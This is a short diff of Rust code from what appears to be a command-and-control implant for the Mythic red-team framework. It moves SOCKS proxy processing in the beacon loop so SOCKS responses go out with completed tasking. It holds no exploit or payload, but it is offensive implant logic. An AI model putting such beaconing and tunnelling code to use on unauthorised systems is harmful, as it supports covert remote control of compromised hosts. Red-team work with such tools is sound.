@@ -131,11 +131,6 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
         // Get new tasing from Mythic
         let pending_tasks = agent.get_tasking()?;
 
-        // Process SOCKS messages if any were received
-        if let Err(e) = crate::socks::process_socks_messages_sync() {
-            eprintln!("SOCKS processing error: {}", e);
-        }
-
         // Process the pending tasks
         agent
             .tasking
@@ -146,6 +141,11 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
 
         // Get the completed task information
         let completed_tasks = agent.tasking.get_completed_tasks()?;
+
+        // Process SOCKS messages before sending response (to include any SOCKS responses)
+        if let Err(e) = crate::socks::process_socks_messages_sync() {
+            eprintln!("SOCKS processing error: {}", e);
+        }
 
         // Send the completed tasking information up to Mythic
         let continued_tasking = agent.send_tasking(&completed_tasks)?;
